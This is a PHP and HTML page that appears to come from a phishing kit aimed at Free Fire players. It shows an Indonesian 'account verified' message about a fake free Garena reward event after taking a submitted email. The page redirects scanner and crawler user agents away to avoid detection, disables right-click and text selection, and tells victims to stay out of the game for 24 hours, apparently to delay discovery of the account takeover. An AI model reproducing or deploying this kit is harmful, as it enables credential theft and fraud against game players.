<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
//MENGAMBIL SISTEM SCRIPT
include 'system/setting.php';

//MENERIMA DATA YANG DI-INPUT
$email = $_POST['email'];

//MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == ""){
header("Location: index.php");
}
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<div class="container">
<div class="container-mask">
<div class="navbar">
<div class="navbar-menu">
<i class="fa fa-bars"></i>
</div> <!--- navbar-menu --->
<div class="navbar-logo-box">
<img src="https://i.ibb.co/cQWNSMv/logo.png">
</div> <!--- navbar-logo-box --->
</div> <!--- navbar --->
<div class="reward-content">
<div class="menu-notify">
<div class="menu-notify-icon"><i class="zmdi zmdi-check-circle"></i></div>
<div class="menu-notify-txt"><div class="notify-process"><div id="timer"></div></div> Verifikasi akun Anda telah berhasil</div>
</div> <!--- menu-notify --->
<div class="message-box-finish">
Hi Survivor
<br>
<br>
Terima kasih telah mengikuti event gratisan Garena ini
<br>
Akun Anda sedang kami proses untuk mengirim hadiah
<br>
Ini memakan waktu 24 Jam
<br>
<br>
Mohon jangan masuk ke Game dulu sebelum 24 Jam
<br>
Anda akan mendapatkan notifikasi dari FREE FIRE saat proses ini sudah selesai
<br>
<br>
<div style="text-align: center;">Tetap main FREE FIRE dan Salam Booyah!</div>
</div>
<button type="button" class="btn-verify" onclick="location.href='/';">
<div class="btn-verify-icon">
<i class="zmdi zmdi-account-circle"></i>
</div>
Keluar dari akun saya
</button>
</div> <!--- reward-content --->
</div> <!--- container-mask --->
</div> <!--- container --->

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/timer.js"></script>

</body>
</html>